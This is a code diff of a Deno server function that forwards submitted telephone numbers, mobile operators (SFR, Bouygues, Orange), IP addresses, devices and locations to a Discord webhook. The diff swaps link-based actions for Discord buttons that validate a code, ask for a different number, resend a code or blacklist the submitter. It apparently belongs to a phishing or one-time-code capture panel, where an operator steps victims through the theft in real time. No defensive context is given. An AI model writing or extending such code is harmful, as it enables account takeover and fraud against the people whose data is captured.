@@ -32,16 +32,6 @@ Deno.serve(async (req) => {
   });
 
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
-  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
-
-  // These links call triggerSendCode with the action param
-  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
-  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
-
-  // Create a simple blacklist URL with base64 encoding
-  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
-  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
 
   let country = "Inconnue";
   let city = "Inconnue";
@@ -82,20 +72,47 @@ Deno.serve(async (req) => {
       { name: "💾 Appareil", value: device, inline: true },
       { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
-      {
-        name: "Actions",
-        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
-        inline: false
-      },
     ],
     footer: { text: `ID: ${submissionId || "N/A"}` },
     timestamp: now.toISOString(),
   };
 
+  const components = [
+    {
+      type: 1,
+      components: [
+        {
+          type: 2,
+          style: 3,
+          label: "✅ Valider le code",
+          custom_id: `send:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 4,
+          label: "❌ Changer le numéro",
+          custom_id: `wrong:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 3,
+          label: "⏰ Renvoyer le code",
+          custom_id: `expired:${submissionId}`
+        },
+        {
+          type: 2,
+          style: 4,
+          label: "🚫 Blacklist",
+          custom_id: `blacklist:${submissionId}`
+        }
+      ]
+    }
+  ];
+
   await fetch(DISCORD_WEBHOOK, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+    body: JSON.stringify({ content: "@everyone", embeds: [embed], components }),
   });
 
   return Response.json({ ok: true });
